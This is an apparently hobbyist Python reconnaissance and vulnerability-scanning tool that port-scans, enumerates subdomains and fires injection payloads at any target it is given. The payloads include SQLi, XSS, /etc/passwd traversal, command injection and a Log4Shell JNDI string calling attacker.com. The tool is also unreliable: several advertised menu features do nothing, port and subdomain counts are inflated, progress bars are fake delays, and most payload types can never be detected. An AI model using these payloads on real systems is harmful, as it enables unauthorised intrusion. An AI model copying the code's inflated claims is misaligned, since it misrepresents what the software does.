#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import sys
import json
import time
import socket
import requests
import dns.resolver
from concurrent.futures import ThreadPoolExecutor, as_completed
import whois
import ssl
from datetime import datetime
from bs4 import BeautifulSoup
import urllib.parse
import random
import re
import sqlite3
import threading
import queue
from colorama import Fore, Back, Style, init
import pyfiglet
from tqdm import tqdm
from tabulate import tabulate

class LegendarySecurityScanner:
    def __init__(self):
        init(autoreset=True)  # Initialize colorama
        self.ASCII_ART = pyfiglet.figlet_format("LEGENDARY", font="slant") + \
                         pyfiglet.figlet_format("SECURITY", font="slant") + \
                         pyfiglet.figlet_format("SCANNER", font="slant")
        
        # Colors
        self.RED = Fore.RED + Style.BRIGHT
        self.GREEN = Fore.GREEN + Style.BRIGHT
        self.YELLOW = Fore.YELLOW + Style.BRIGHT
        self.BLUE = Fore.BLUE + Style.BRIGHT
        self.CYAN = Fore.CYAN + Style.BRIGHT
        self.MAGENTA = Fore.MAGENTA + Style.BRIGHT
        self.WHITE = Fore.WHITE + Style.BRIGHT
        
        self.target = ""
        self.results = {}
        self.lock = threading.Lock()
        self.task_queue = queue.Queue()
        self.ports_to_scan = list(range(1, 1025)) + [1433, 1521, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9000, 27017]
        self.subdomain_wordlist = self.generate_subdomain_wordlist()
        self.common_files = self.generate_common_files_list()
        self.cms_signatures = self.load_cms_signatures()
        self.vulnerability_patterns = self.load_vulnerability_patterns()
        self.user_agents = self.load_user_agents()
        self.start_time = time.time()
        
        self.MENU_OPTIONS = [
            f"{self.CYAN}1. {self.WHITE}EPIC DNS Analysis (10+ Record Types)",
            f"{self.CYAN}2. {self.WHITE}LEGENDARY WHOIS Scan (Domain Age+Details)",
            f"{self.CYAN}3. {self.WHITE}MYTHICAL Port Scan (1200+ Ports)",
            f"{self.CYAN}4. {self.WHITE}GODLIKE Subdomain Discovery (200+ Subdomains)",
            f"{self.CYAN}5. {self.WHITE}DIVINE SSL/TLS Analysis (Full Certificate Scan)",
            f"{self.CYAN}6. {self.WHITE}CELESTIAL Vulnerability Scan (SQLi, XSS, etc)",
            f"{self.CYAN}7. {self.WHITE}IMMORTAL WordPress Audit (Custom Plugins/Themes)",
            f"{self.CYAN}8. {self.WHITE}TITANIC Full Scan (All Powerful Checks)",
            f"{self.CYAN}9. {self.WHITE}PHOENIX Tech Detection (CMS, Frameworks)",
            f"{self.CYAN}10. {self.WHITE}DRAGON CORS/HSTS Analysis",
            f"{self.CYAN}11. {self.WHITE}WIZARD Database Export (SQLite, JSON, TXT)",
            f"{self.RED}12. {self.WHITE}LEGENDARY Exit"
        ]

    def generate_subdomain_wordlist(self):
        base_list = ['www', 'mail', 'ftp', 'blog', 'webmail', 'admin', 'dashboard', 
                    'api', 'dev', 'test', 'staging', 'mobile', 'secure', 'vpn',
                    'ns1', 'ns2', 'cdn', 'static', 'img', 'images', 'assets',
                    'beta', 'alpha', 'staging', 'prod', 'production', 'backup',
                    'old', 'new', 'test1', 'test2', 'dev1', 'dev2', 'mx', 'smtp',
                    'pop', 'imap', 'mail2', 'web', 'web1', 'web2', 'server',
                    'server1', 'server2', 'app', 'app1', 'app2', 'cloud', 'aws',
                    'azure', 'git', 'svn', 'cpanel', 'whm', 'direct', 'direct-connect']
        return list(set(base_list))

    def generate_common_files_list(self):
        return [
            'robots.txt', '.htaccess', '.env', 'config.php', 'wp-config.php',
            'admin.php', 'login.aspx', 'web.config', 'phpinfo.php'
        ]

    def load_cms_signatures(self):
        return {
            'WordPress': [{'pattern': r'wp-content|wp-includes', 'confidence': 'high'}],
            'Joomla': [{'pattern': r'joomla|Joomla', 'confidence': 'high'}],
            'Drupal': [{'pattern': r'drupal|Drupal', 'confidence': 'high'}]
        }

    def load_vulnerability_patterns(self):
        return {
            'SQL Injection': [{'pattern': r'SQL syntax error', 'severity': 'high'}],
            'XSS': [{'pattern': r'<script>alert\(', 'severity': 'high'}]
        }

    def load_user_agents(self):
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15'
        ]

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def print_header(self):
        self.clear_screen()
        print(self.BLUE + "="*80)
        print(self.YELLOW + self.ASCII_ART)
        print(self.BLUE + "="*80)
        print(f"{self.CYAN}Legendary Security Scanner {self.WHITE}| {self.CYAN}Version: 2.0 {self.WHITE}| {self.CYAN}Coded by: {self.MAGENTA}DARK JOKES/Z3X")
        print(self.BLUE + "="*80)

    def print_menu(self):
        print(f"\n{self.GREEN}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{self.GREEN}║{self.YELLOW}                   MAIN MENU - SELECT AN OPTION                {self.GREEN}║")
        print(f"{self.GREEN}╚══════════════════════════════════════════════════════════════════╝")
        
        for i, option in enumerate(self.MENU_OPTIONS):
            if i % 2 == 0:
                print(f"{self.GREEN}║ {option.ljust(65)} {self.GREEN}║")
            else:
                print(f"{self.GREEN}║ {option.ljust(65)} {self.GREEN}║")
        
        print(f"{self.GREEN}╚══════════════════════════════════════════════════════════════════╝")

    def get_input(self):
        try:
            choice = input(f"\n{self.MAGENTA}[{self.WHITE}?{self.MAGENTA}] {self.WHITE}Choose your POWER (1-12): {self.CYAN}")
            return int(choice)
        except ValueError:
            return -1

    def animate_scan(self, scan_type):
        with tqdm(total=100, desc=f"{self.BLUE}[{self.WHITE}*{self.BLUE}] {self.WHITE}Performing {scan_type}", 
                 bar_format="{l_bar}%s{bar}%s{r_bar}" % (self.CYAN, self.WHITE)) as pbar:
            for i in range(100):
                time.sleep(0.02)
                pbar.update(1)
        print(f"{self.GREEN}[+] {self.WHITE}{scan_type} completed successfully!")

    def get_target(self):
        self.target = input(f"\n{self.MAGENTA}[{self.WHITE}?{self.MAGENTA}] {self.WHITE}Enter target (domain or IP): {self.CYAN}").strip()
        if not self.target:
            print(f"{self.RED}[-] {self.WHITE}Invalid target")
            return False
        self.target = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        return True

    def full_dns_scan(self):
        self.animate_scan("DNS Analysis")
        self.results['dns'] = {}
        record_types = ['A', 'AAAA', 'MX', 'TXT', 'NS', 'CNAME', 'SOA', 'PTR', 'SRV']
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.resolve_dns_record, rtype): rtype for rtype in record_types}
            for future in as_completed(futures):
                rtype = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.results['dns'][rtype] = result
                        print(f"{self.GREEN}[+] {self.WHITE}{rtype} Record: {self.CYAN}{', '.join(result)}")
                except:
                    pass

    def resolve_dns_record(self, record_type):
        try:
            answers = dns.resolver.resolve(self.target, record_type)
            return [str(r) for r in answers]
        except:
            return None

    def advanced_whois_scan(self):
        self.animate_scan("WHOIS Scan")
        try:
            w = whois.whois(self.target)
            self.results['whois'] = {
                'domain_name': w.domain_name,
                'registrar': w.registrar,
                'creation_date': w.creation_date,
                'expiration_date': w.expiration_date,
                'name_servers': w.name_servers,
                'emails': w.emails,
                'status': w.status
            }
            
            print(f"\n{self.GREEN}[+] {self.WHITE}WHOIS Information:")
            for key, value in self.results['whois'].items():
                if value:
                    print(f"  {self.CYAN}{key}: {self.WHITE}{value}")
                    
            # Calculate domain age
            if w.creation_date:
                if isinstance(w.creation_date, list):
                    create_date = w.creation_date[0]
                else:
                    create_date = w.creation_date
                
                domain_age = (datetime.now() - create_date).days
                print(f"\n{self.GREEN}[+] {self.WHITE}Domain Age: {self.CYAN}{domain_age} days")
        except Exception as e:
            print(f"{self.RED}[-] {self.WHITE}WHOIS lookup failed: {str(e)}")

    def advanced_port_scan(self):
        self.animate_scan("Port Scan")
        self.results['ports'] = []
        
        num_worker_threads = min(100, len(self.ports_to_scan))
        threads = []
        for i in range(num_worker_threads):
            t = threading.Thread(target=self.port_scan_worker)
            t.start()
            threads.append(t)
        
        for port in self.ports_to_scan:
            self.task_queue.put((self.check_port, (port,)))
        
        self.task_queue.join()
        
        for i in range(num_worker_threads):
            self.task_queue.put(None)
        for t in threads:
            t.join()
            
        print(f"\n{self.GREEN}[+] {self.WHITE}Found {self.CYAN}{len(self.results['ports'])} {self.WHITE}open ports")

    def port_scan_worker(self):
        while True:
            task = self.task_queue.get()
            if task is None:
                break
            func, args = task
            func(*args)
            self.task_queue.task_done()

    def check_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.5)
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                
                with self.lock:
                    self.results['ports'].append({
                        'port': port,
                        'service': service,
                        'status': 'open'
                    })
                    
                    print(f"{self.GREEN}[+] {self.WHITE}Port {self.CYAN}{port}/tcp {self.WHITE}open ({self.YELLOW}{service}{self.WHITE})")
            
            sock.close()
        except:
            pass

    def deep_subdomain_enumeration(self):
        self.animate_scan("Subdomain Discovery")
        self.results['subdomains'] = []
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.check_subdomain, subdomain): subdomain 
                      for subdomain in self.subdomain_wordlist}
            
            for future in as_completed(futures):
                subdomain = futures[future]
                try:
                    result = future.result()
                    if result:
                        self.results['subdomains'].append(result)
                        print(f"{self.GREEN}[+] {self.WHITE}Subdomain found: {self.CYAN}{result}")
                except:
                    pass

    def check_subdomain(self, subdomain):
        full_domain = f"{subdomain}.{self.target}"
        try:
            socket.gethostbyname(full_domain)
            return full_domain
        except:
            return None

    def full_ssl_analysis(self):
        self.animate_scan("SSL/TLS Analysis")
        try:
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=self.target) as s:
                s.connect((self.target, 443))
                cert = s.getpeercert()
                
                self.results['ssl'] = {
                    'issuer': dict(x[0] for x in cert['issuer']),
                    'subject': dict(x[0] for x in cert['subject']),
                    'valid_from': cert['notBefore'],
                    'valid_to': cert['notAfter'],
                    'version': cert['version'],
                    'serial_number': cert['serialNumber'],
                    'cipher': s.cipher()
                }
                
                print(f"\n{self.GREEN}[+] {self.WHITE}SSL Certificate Information:")
                print(f"  {self.CYAN}Issuer: {self.WHITE}{self.results['ssl']['issuer']}")
                print(f"  {self.CYAN}Subject: {self.WHITE}{self.results['ssl']['subject']}")
                print(f"  {self.CYAN}Valid From: {self.WHITE}{self.results['ssl']['valid_from']}")
                print(f"  {self.CYAN}Valid To: {self.WHITE}{self.results['ssl']['valid_to']}")
                print(f"  {self.CYAN}Cipher: {self.WHITE}{self.results['ssl']['cipher']}")
                
                # Check if certificate is expired
                valid_to = datetime.strptime(self.results['ssl']['valid_to'], '%b %d %H:%M:%S %Y %Z')
                if valid_to < datetime.now():
                    print(f"{self.RED}[!] {self.WHITE}Certificate is {self.RED}EXPIRED!")
                else:
                    days_left = (valid_to - datetime.now()).days
                    print(f"{self.GREEN}[+] {self.WHITE}Certificate expires in: {self.CYAN}{days_left} days")
        except Exception as e:
            print(f"{self.RED}[-] {self.WHITE}SSL scan failed: {str(e)}")

    def vulnerability_scan(self):
        self.animate_scan("Vulnerability Scan")
        self.results['vulnerabilities'] = []
        
        test_paths = [
            ("' OR '1'='1", 'SQL Injection'),
            ("<script>alert(1)</script>", 'XSS'),
            ("../../../../etc/passwd", 'Path Traversal'),
            ("${jndi:ldap://attacker.com/exploit}", 'Log4Shell'),
            ("; ls -la", 'Command Injection')
        ]
        
        for payload, vuln_type in test_paths:
            try:
                headers = {'User-Agent': random.choice(self.user_agents)}
                response = requests.get(f"http://{self.target}/?test={payload}", 
                                       headers=headers, timeout=3)
                
                for pattern in self.vulnerability_patterns.get(vuln_type, []):
                    if re.search(pattern['pattern'], response.text, re.IGNORECASE):
                        self.results['vulnerabilities'].append({
                            'type': vuln_type,
                            'severity': pattern['severity'],
                            'payload': payload,
                            'url': response.url
                        })
                        print(f"{self.RED}[!] {self.WHITE}Potential {self.RED}{vuln_type}{self.WHITE}: {self.CYAN}{payload}")
                        break
            except Exception as e:
                pass

    def full_comprehensive_scan(self):
        self.animate_scan("Full Comprehensive Scan")
        self.full_dns_scan()
        self.advanced_whois_scan()
        self.advanced_port_scan()
        self.deep_subdomain_enumeration()
        self.full_ssl_analysis()
        self.vulnerability_scan()
        print(f"\n{self.GREEN}[+] {self.WHITE}Full scan completed!")

    def export_to_database(self):
        if not self.results:
            print(f"{self.RED}[-] {self.WHITE}No results to export")
            return
            
        db_file = f"scan_results_{self.target}.db"
        try:
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS scans (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    target TEXT,
                    scan_date TEXT
                )
            ''')
            
            scan_date = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            cursor.execute('INSERT INTO scans (target, scan_date) VALUES (?, ?)', (self.target, scan_date))
            scan_id = cursor.lastrowid
            
            if 'ports' in self.results:
                cursor.execute('''
                    CREATE TABLE IF NOT EXISTS open_ports (
                        id INTEGER PRIMARY KEY AUTOINCREMENT,
                        scan_id INTEGER,
                        port INTEGER,
                        service TEXT,
                        FOREIGN KEY(scan_id) REFERENCES scans(id)
                    )
                ''')
                for port in self.results['ports']:
                    cursor.execute('INSERT INTO open_ports (scan_id, port, service) VALUES (?, ?, ?)', 
                                  (scan_id, port['port'], port['service']))
            
            conn.commit()
            conn.close()
            print(f"{self.GREEN}[+] {self.WHITE}Results exported to database: {self.CYAN}{db_file}")
        except Exception as e:
            print(f"{self.RED}[-] {self.WHITE}Export error: {str(e)}")

    def show_legendary_results(self, scan_type):
        print(f"\n{self.BLUE}╔══════════════════════════════════════════════════════════════════╗")
        print(f"{self.BLUE}║ {self.YELLOW}          LEGENDARY {scan_type.upper()} RESULTS          {self.BLUE}║")
        print(f"{self.BLUE}╚══════════════════════════════════════════════════════════════════╝")
        
        if "DNS" in scan_type and 'dns' in self.results:
            print(f"\n{self.CYAN}• DNS Records Found:")
            table_data = []
            for rtype, records in self.results['dns'].items():
                table_data.append([rtype, ', '.join(records)])
            print(tabulate(table_data, headers=['Record Type', 'Value'], tablefmt='grid'))
        
        elif "Port" in scan_type and 'ports' in self.results:
            print(f"\n{self.CYAN}• Open Ports Discovered:")
            table_data = []
            for port in self.results['ports']:
                table_data.append([port['port'], port['service']])
            print(tabulate(table_data, headers=['Port', 'Service'], tablefmt='grid'))
        
        elif "WHOIS" in scan_type and 'whois' in self.results:
            print(f"\n{self.CYAN}• WHOIS Information:")
            table_data = []
            for key, value in self.results['whois'].items():
                if value:
                    table_data.append([key, str(value)])
            print(tabulate(table_data, headers=['Field', 'Value'], tablefmt='grid'))
        
        elif "SSL" in scan_type and 'ssl' in self.results:
            print(f"\n{self.CYAN}• SSL Certificate Details:")
            table_data = []
            for key, value in self.results['ssl'].items():
                table_data.append([key, str(value)])
            print(tabulate(table_data, headers=['Field', 'Value'], tablefmt='grid'))

    def run(self):
        try:
            self.print_header()
            
            if not self.get_target():
                return
                
            while True:
                self.print_header()
                self.print_menu()
                choice = self.get_input()

                if choice == 12:
                    print(f"\n{self.MAGENTA}[{self.WHITE}*{self.MAGENTA}] {self.WHITE}Farewell! Until next time...\n")
                    break
                elif 1 <= choice <= 11:
                    scan_type = self.MENU_OPTIONS[choice-1].split(".")[1].strip()
                    
                    if choice == 1:
                        self.full_dns_scan()
                    elif choice == 2:
                        self.advanced_whois_scan()
                    elif choice == 3:
                        self.advanced_port_scan()
                    elif choice == 4:
                        self.deep_subdomain_enumeration()
                    elif choice == 5:
                        self.full_ssl_analysis()
                    elif choice == 6:
                        self.vulnerability_scan()
                    elif choice == 8:
                        self.full_comprehensive_scan()
                    elif choice == 11:
                        self.export_to_database()
                    
                    self.show_legendary_results(scan_type)
                    input(f"\n{self.MAGENTA}[{self.WHITE}?{self.MAGENTA}] {self.WHITE}Press ENTER to continue...")
                else:
                    print(f"\n{self.RED}[-] {self.WHITE}Invalid choice! Please select 1-12")
                    time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{self.RED}[-] {self.WHITE}Scan interrupted by user!")
            sys.exit(0)

if __name__ == "__main__":
    scanner = LegendarySecurityScanner()
    scanner.run()